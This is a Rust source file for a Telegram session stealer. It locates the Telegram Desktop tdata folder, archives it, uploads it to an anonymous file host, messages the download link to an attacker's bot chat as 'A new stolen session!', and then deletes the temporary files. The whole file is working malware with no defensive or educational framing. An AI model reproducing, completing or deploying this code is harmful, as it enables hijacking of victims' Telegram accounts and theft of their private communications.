use std::path::Path;

use crate::utils::filesystem::{copy_dirs, zip_dir};
use crate::utils::net::{AnonFilesUploader, TelegramBotSender};
use crate::utils::os::{generate_uuid, get_temp_dir_path};
use crate::utils::{os::get_directory_by_process, types::Result};

struct TelegramFolder {}

impl TelegramFolder {
    // TODO: I think this is not working correctly.
    const DEFAULT_TELEGRAM_PATH: &'static str =
        "C:\\Users\\%username%\\AppData\\Roaming\\Telegram Desktop\\";

    const TELEGRAM_PROCESS_NAME: &'static str = "Telegram";

    fn get_telegram_session_folder_path() -> String {
        let mut telegram_folder = get_directory_by_process(TelegramFolder::TELEGRAM_PROCESS_NAME);
        if telegram_folder.is_none() {
            telegram_folder = Some(TelegramFolder::DEFAULT_TELEGRAM_PATH.to_string());
        }
        let mut session_path = telegram_folder.unwrap();
        session_path.push_str("\\Tdata");
        session_path
    }
}

struct TelegramTarArchiver {}

impl TelegramTarArchiver {
    const TAR_ARCHIVE_NAME: &'static str = "session.tar";

    fn create_temp_dir() -> Result<String> {
        let mut temp_dir = get_temp_dir_path()?;
        temp_dir.push_str(&generate_uuid());
        Ok(temp_dir)
    }

    fn archive(path_to_folder: &str) -> Result<String> {
        let temp_dir = TelegramTarArchiver::create_temp_dir()?;

        let mut temp_session_dir = temp_dir.clone();
        temp_session_dir.push_str("\\session");
        copy_dirs(path_to_folder, &temp_session_dir)?;

        let mut archive_path = temp_dir;
        archive_path.push('\\');
        archive_path.push_str(TelegramTarArchiver::TAR_ARCHIVE_NAME);
        zip_dir(&archive_path, temp_session_dir)?;

        Ok(archive_path)
    }

    fn remove_archive_folder(archive_path: &str) -> Result<()> {
        let mut temp_session_folder_path = archive_path.to_string();
        temp_session_folder_path =
            temp_session_folder_path.replace(TelegramTarArchiver::TAR_ARCHIVE_NAME, "");
        std::fs::remove_dir_all(&temp_session_folder_path)?;
        Ok(())
    }
}

pub struct TelegramStealer {
    pub token: String,
    pub chat_id: String,
}

impl TelegramStealer {
    pub fn new(token: String, chat_id: String) -> Self {
        TelegramStealer { token, chat_id }
    }

    fn build_message(&self, path_to_archive: &str) -> String {
        format!("A new stolen session! \n\n{}", path_to_archive)
    }

    pub fn steal(&self) -> Result<()> {
        let telegram_folder = TelegramFolder::get_telegram_session_folder_path();
        // Check if Tdata is exists
        if !Path::new(&telegram_folder).exists() {
            return Err("Telegram session folder not found!".into());
        }
        let archive_path = TelegramTarArchiver::archive(&telegram_folder)?;
        println!("{}", archive_path);

        let url = AnonFilesUploader::new(archive_path.clone()).upload()?;
        println!("{}", url);

        TelegramBotSender::new(self.token.clone(), self.chat_id.clone())
            .send_message(self.build_message(&url).as_str())?;

        TelegramTarArchiver::remove_archive_folder(&archive_path)?;
        Ok(())
    }
}
